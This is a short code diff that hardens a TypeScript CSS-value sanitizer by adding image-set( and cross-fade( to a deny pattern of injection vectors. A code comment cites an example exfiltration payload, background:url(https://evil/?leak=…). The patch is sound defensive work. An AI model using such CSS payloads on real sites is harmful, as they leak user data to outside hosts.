@@ -27,7 +27,7 @@ function clean(v: unknown): string | number | undefined {
   if (/[<>{};]/.test(s)) return undefined;
   // Block url() too: a CSS url() can exfiltrate to an external host (e.g.
   // background:url(https://evil/?leak=…)). Images go through the image atom + safeImageSrc.
-  if (/expression\(|javascript:|vbscript:|@import|url\s*\(/i.test(s)) return undefined;
+  if (/expression\(|javascript:|vbscript:|@import|url\s*\(|image-set\s*\(|cross-fade\s*\(/i.test(s)) return undefined;
   return s;
 }
 
